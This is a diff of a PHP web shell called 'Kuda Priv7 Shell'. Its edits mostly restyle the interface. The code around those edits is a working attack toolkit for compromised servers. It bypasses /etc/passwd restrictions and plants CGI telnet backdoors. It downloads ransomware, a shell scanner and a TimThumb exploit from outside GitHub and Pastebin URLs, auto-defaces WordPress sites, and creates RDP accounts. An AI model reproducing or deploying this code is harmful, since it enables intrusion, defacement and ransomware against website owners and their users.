@@ -3808,9 +3944,9 @@ echo '<tr><td>Sha1 with Salt: <input type="text" size="50" value="' . htmlspecia
 echo '<tr><td>Sha1 with Salt & MD5: <input type="text" size="50" value="' . htmlspecialchars($hash1_sha1_double) . '"></td></tr>';
 echo '</table>';
 echo '</form>';
-echo '</div>';
+echo '</div></div>';
 } elseif ($_GET['bypass'] == 'etcpass') {
-  echo '<center>Bypass /etc/passwd With:<br>
+  echo '<div class="mybox"><center><h3>Bypass /etc/passwd</h3>Bypass /etc/passwd With:<br>
   <table style="width:50%">
   <tr>
   <td><form method="post"><input type="submit" value="System Function" name="syst"></form></td>
@@ -3889,7 +4025,7 @@ echo '</div>';
   }
 } elseif ($_GET['do'] == 'cgitelnet') {
   $full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
-  echo "<center><h3>Cgi Telnet</h3>";
+  echo "<div class='mybox'><center><h3>Cgi Telnet</h3>";
   echo "<form method='post'><input type='submit' name='cgi' value='CGI PERL'> <input type='submit' name='cgi2' value='CGI PERL 2'> <input type='submit' name='cgipy' value='CGI PYTHON'></form>";
   if (isset($_POST['cgi'])) {
     mkdir('kuda_cgi', 0755);
@@ -3936,10 +4072,10 @@ echo '</div>';
     chmod($memeg, 0755);
     echo "<center>Done <a href='$full/kuda_cgi/cgipy.kuda' target='_blank'><font color='lime'>Click Here</a></font>";
   }
+  echo "</center></div>";
   echo "</center>";
   echo "</center>";
-  echo "</center>";
-  echo "</center>";
+  echo "</center></div>";
 } elseif ($_GET['do'] == 'fake_root') {
   ob_start();
   $cwd = getcwd();
@@ -3955,7 +4091,7 @@ echo '</div>';
       }
     }
   } else {
-    echo "<center><form method='post'>
+    echo "<div class='mybox'><center><h3>Fake Root Scanner</h3><form method='post'>
     Filename: <br><input type='text' name='file' value='deface.html' size='50' height='10'><br>
     User: <br><input type='text' value='$user' size='50' height='10' readonly><br>
     Domain: <br>
@@ -3971,7 +4107,7 @@ echo '</div>';
 <tr>
   <td>
     <center>
-      <h3 style='color: deepskyblue;'>Kuda Priv7 Shell</h3>
+      <div class="mybox about-section"><h3>Kuda Priv7 Shell</h3>
       <p style='color: white;'>greetz:</p>
       <font color="cyan">[</font>
       <marquee scrollamount="10" style="width: 20%;">Nobody, just me</marquee>
@@ -3981,9 +4117,9 @@ echo '</div>';
 </tr>
 <?php
 } elseif ($_GET['do'] == 'contact') {
-  echo "<center><h3>Contact</h3>
+  echo "<div class='mybox'><center><h3>Contact</h3>
   <table><td style='background-color: transparent; text-align: center; border: 2px aqua dotted; width:300px; height:60px;'>
-  <font color='cyan'>Email: mrxbarakuda@merahputih.id<br>Find Me: <a href='https://www.google.com/search?q=intext:Mr.xBarakuda' target='_blank'>Mr.xBarakuda</a></font></tr></td></table></center>";
+  <font color='cyan'>Email: mrxbarakuda@merahputih.id<br>Find Me: <a href='https://www.google.com/search?q=intext:Mr.xBarakuda' target='_blank'>Mr.xBarakuda</a></font></tr></td></table></center></div>";
 } elseif ($_GET['do'] == 'adminer') {
   $full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
   function adminer($url, $isi) {
@@ -4001,10 +4137,10 @@ echo '</div>';
     flush();
   }
   if (file_exists('adminer.php')) {
-    echo "<center><a href='$full/adminer.php' target='_blank'><font color='lime'>> ADMINER LOGIN <</a></font></center>";
+echo "<div class='mybox'><center><h3>Adminer</h3><a href='$full/adminer.php' target='_blank'><font color='lime'>> ADMINER LOGIN <</a></font></center>";
   } else {
     if (adminer("https://github.com/vrana/adminer/releases/download/v5.4.2/adminer-5.4.2.php", "adminer.php")) {
-      echo "<center><a href='$full/adminer.php' target='_blank'><font color='lime'>> ADMINER LOGIN <</a></font></center>";
+echo "<center><a href='$full/adminer.php' target='_blank'><font color='lime'>> ADMINER LOGIN <</a></font></center></div>";
     } else {
       echo "<center><font color='red'>gagal buat file adminer</font></center>";
     }
@@ -4026,7 +4162,7 @@ echo '</div>';
     flush();
   }
   if (file_exists('ransom.php')) {
-    echo "<center><a href='$full/ransom.php' target='_blank'><font color='lime'>> RANSOMWARE <</a></font></center>";
+    echo "<div class='mybox'><center><h3>Ransomware</h3><a href='$full/ransom.php' target='_blank'><font color='lime'>> RANSOMWARE <</a></font></center>";
   } else {
     if (explo("https://raw.githubusercontent.com/mrxbarakuda/paste/refs/heads/main/ransom.txt", "ransom.php")) {
       echo "<center><a href='$full/ransom.php' target='_blank'><font color='lime'>> RANSOMWARE <</a></font></center>";
@@ -4051,12 +4187,12 @@ echo '</div>';
     flush();
   }
   if (file_exists('kudascan.php')) {
-    echo "<center><a href='$full/kudascan.php' target='_blank'><font color='lime'>> SCANNER SHELL <</a></font></center>";
+echo "<div class='mybox'><center><h3>Shell Scanner v1.1</h3><a href='$full/kudascan.php' target='_blank'><font color='lime'>> SCANNER SHELL <</a></font></center>";
   } else {
     if (tod("https://raw.githubusercontent.com/mrxbarakuda/scanner-shell/refs/heads/master/kudascan.txt", "kudascan.php")) {
-      echo "<center><a href='$full/kudascan.php' target='_blank'><font color='lime'>> SCANNER SHELL <</a></font></center>";
+echo "<center><a href='$full/kudascan.php' target='_blank'><font color='lime'>> SCANNER SHELL <</a></font></center></div>";
     } else {
-      echo "<center><font color='red'>gagal buat file scanner</font></center>";
+      echo "<center><font color='red'>gagal buat file scanner</font></center></div>";
     }
   }
 } elseif ($_GET['do'] == 'wp_timthumb') {
@@ -4076,10 +4212,10 @@ echo '</div>';
     flush();
   }
   if (file_exists('wp-timthumb.php')) {
-    echo "<center><a href='$full/wp-timthumb.php' target='_blank'><font color='lime'>> WP-TIMTHUMB <</a></font></center>";
+echo "<div class='mybox'><center><h3>WP TimThumb Finder</h3><a href='$full/wp-timthumb.php' target='_blank'><font color='lime'>> WP-TIMTHUMB <</a></font></center>";
   } else {
     if (kentod("https://pastebin.com/raw/Fn4X835C", "wp-timthumb.php")) {
-      echo "<center><a href='$full/wp-timthumb.php' target='_blank'><font color='lime'>> WP-TIMTHUMB <</a></font></center>";
+echo "<center><a href='$full/wp-timthumb.php' target='_blank'><font color='lime'>> WP-TIMTHUMB <</a></font></center></div>";
     } else {
       echo "<center><font color='red'>gagal buat file timthumb</font></center>";
     }
@@ -4207,7 +4343,7 @@ echo '</div>';
       }
     }
   } else {
-    echo "<center><h3>WordPress Auto Deface</h3>
+    echo "<div class='mybox'><center><h3>WordPress Auto Deface</h3>
     <form method='post'>
     <input type='text' name='link_config' size='50' height='10' value='$dir'><br>
     <input type='text' name='script' height='10' size='50' placeholder='Penetrated by Mr.xBarakuda' required><br>
@@ -4335,7 +4471,7 @@ echo '</div>';
       }
     }
   } else {
-    echo "<center><h3>WordPress Auto Deface V.2</h3>
+    echo "<div class='mybox'><center><h3>WordPress Auto Deface V.2</h3>
     <form method='post'>
     Link Config: <br>
     <textarea name='link' placeholder='http://target.com/kuda_config/user-config.txt' style='width: 450px; height:250px;'></textarea><br>
@@ -4421,7 +4557,7 @@ echo '</div>';
 
       }
     } else {
-      echo "-- Create RDP --<br>
+      echo "<div class='mybox'><center><h3>K-RDP Shell</h3>-- Create RDP --<br>
       <form method='post'>
       <input type='text' name='user' placeholder='username' value='mrxbarakuda' required>
       <input type='text' name='pass' placeholder='password' value='mrxbarakuda' required>
